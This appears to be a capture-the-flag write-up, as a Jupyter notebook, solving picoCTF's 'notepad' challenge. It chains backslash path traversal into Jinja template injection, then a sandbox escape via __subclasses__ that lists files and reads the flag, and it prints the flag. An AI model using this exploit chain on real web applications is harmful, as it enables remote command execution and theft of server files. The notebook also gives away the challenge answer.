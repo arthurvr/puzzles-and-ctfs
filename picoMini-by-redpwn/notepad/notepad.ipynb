{
  "nbformat": 4,
  "nbformat_minor": 0,
  "metadata": {
    "colab": {
      "provenance": []
    },
    "kernelspec": {
      "name": "python3",
      "display_name": "Python 3"
    },
    "language_info": {
      "name": "python"
    }
  },
  "cells": [
    {
      "cell_type": "markdown",
      "source": [
        "# notepad\n",
        "\n",
        "> This note-taking site seems a bit off.\n",
        "\n",
        "This is a very interesting line in the given source code:\n",
        "\n",
        "```\n",
        "f\"static/{url_fix(content[:128])}-{token_urlsafe(8)}.html\"\n",
        "```\n",
        "\n",
        "With those first 128 tokens we control, we can try to put our file contents in a different directory. However, `url_fix` does block `/` characters... Luckily, they put in this line:\n",
        "\n",
        "```\n",
        "s = _to_str(s, charset, \"replace\").replace(\"\\\\\", \"/\")\n",
        "```\n",
        "\n",
        "Backslashes are usually invalid in URLs, so this line is really strange... and very useful! Using these backslashes to denote directories, we can force our note to be saved in `errors/`, and hence, also force template code inside to be parsed! For example, using this payload:\n",
        "\n",
        "```\n",
        "..\\templates\\errors\\aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaabcdefg\n",
        "This is a test {{request}}\n",
        "```\n",
        "\n",
        "After submitting this we can surf to the new error page, `https://notepad.mars.picoctf.net/?error=aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaabcdefg-x_3vhZ4pt4c`, and the template string is being parsed! So we have ourselves a **template injection vulnerability**.\n",
        "\n",
        "Let's try to automate this with a script before continuing to explore our possibilities:"
      ],
      "metadata": {
        "id": "6vTjJNs81EcV"
      }
    },
    {
      "cell_type": "code",
      "source": [
        "import requests\n",
        "import re\n",
        "import html\n",
        "from pathlib import Path\n",
        "from urllib.parse import urlparse\n",
        "\n",
        "\n",
        "def submit_payload(template_str):\n",
        "  file_url = \"..\\\\templates\\\\errors\\\\\".ljust(128, 'a')\n",
        "  data = {\n",
        "    \"content\": f\"{file_url}\\nAAAA{template_str}BBBB\"\n",
        "  }\n",
        "  r = requests.post(\"https://notepad.mars.picoctf.net/new\", data = data)\n",
        "  new_file_name = Path(urlparse(r.url).path).stem\n",
        "  \n",
        "  r = requests.get(f\"https://notepad.mars.picoctf.net?error={new_file_name}\")\n",
        "  marker_regex = re.compile(f\"AAAA(.*)BBBB\")\n",
        "  match = marker_regex.search(r.text)\n",
        "  print(html.unescape(match.group(1)))\n",
        "\n",
        "submit_payload(\"abcd {{request}}\")"
      ],
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "id": "mD4G7H5b38fY",
        "outputId": "d8c56cd7-6eda-4ea4-de23-8d413d7b3225"
      },
      "execution_count": 11,
      "outputs": [
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "abcd <Request 'http://notepad.mars.picoctf.net/?error=aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa-pHwxoCtJQiU' [GET]>\n"
          ]
        }
      ]
    },
    {
      "cell_type": "markdown",
      "source": [
        " Now, on to exploiting this template injection. I used [this trick](https://gynvael.coldwind.pl/n/python_sandbox_escape) with URL parameters to be able to use any string I need. This is necessary because I will need `_`-characters to get into the `__class__` object and call arbitrary methods, but these are usually not allowed. Go read the linked blogpost!\n",
        "\n",
        "The modified method looks like this:"
      ],
      "metadata": {
        "id": "XTEEOy-N5qYq"
      }
    },
    {
      "cell_type": "code",
      "source": [
        "def submit_payload(template_str, params):\n",
        "  file_url = \"..\\\\templates\\\\errors\\\\\".ljust(128, 'a')\n",
        "  data = {\n",
        "    \"content\": f\"{file_url}\\nAAAA{template_str}BBBB\"\n",
        "  }\n",
        "  r = requests.post(\"https://notepad.mars.picoctf.net/new\", data = data)\n",
        "  new_file_name = Path(urlparse(r.url).path).stem\n",
        "  \n",
        "  r = requests.get(f\"https://notepad.mars.picoctf.net?error={new_file_name}&{params}\")\n",
        "  marker_regex = re.compile(f\"AAAA(.*)BBBB\")\n",
        "  match = marker_regex.search(r.text)\n",
        "  print(html.unescape(match.group(1)))\n",
        "\n",
        "submit_payload(\"abcd {{request.args.get('p1')}}\", \"p1=hello\")"
      ],
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "id": "4fBmiIpv6EpX",
        "outputId": "19b6e181-cb91-4823-a6c4-ea825ce08642"
      },
      "execution_count": 17,
      "outputs": [
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "abcd hello\n"
          ]
        }
      ]
    },
    {
      "cell_type": "markdown",
      "source": [
        "Now I just have to dig around a bit in `__class__` and `__subclasses__` on the objects, to find the required method, and find the required flag file:"
      ],
      "metadata": {
        "id": "NzQoCHh87P23"
      }
    },
    {
      "cell_type": "code",
      "source": [
        "submit_payload(\"{{''[request.args.get('class')].mro()[1][request.args.get('subclasses')]()[273](['ls'],stdout=-1).communicate()}}\", \"class=__class__&subclasses=__subclasses__\")"
      ],
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "id": "NfGWYeq77jYI",
        "outputId": "d23cd534-baba-41b8-d48f-6f68cf09bc30"
      },
      "execution_count": 19,
      "outputs": [
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "(b'app.py\\nflag-c8f5526c-4122-4578-96de-d7dd27193798.txt\\nstatic\\ntemplates\\n', None)\n"
          ]
        }
      ]
    },
    {
      "cell_type": "markdown",
      "source": [
        "And now I can also read that file:"
      ],
      "metadata": {
        "id": "5xs_TiUn75TJ"
      }
    },
    {
      "cell_type": "code",
      "source": [
        "submit_payload(\"{{''[request.args.get('class')].mro()[1][request.args.get('subclasses')]()[273](['cat','flag-c8f5526c-4122-4578-96de-d7dd27193798.txt'],stdout=-1).communicate()}}\", \"class=__class__&subclasses=__subclasses__\")"
      ],
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "id": "4O9n9X-J7z-w",
        "outputId": "7e1e82e6-c5e5-4e55-85c3-d316982a2de3"
      },
      "execution_count": 20,
      "outputs": [
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "(b'picoCTF{styl1ng_susp1c10usly_s1m1l4r_t0_p4steb1n}\\n', None)\n"
          ]
        }
      ]
    }
  ]
}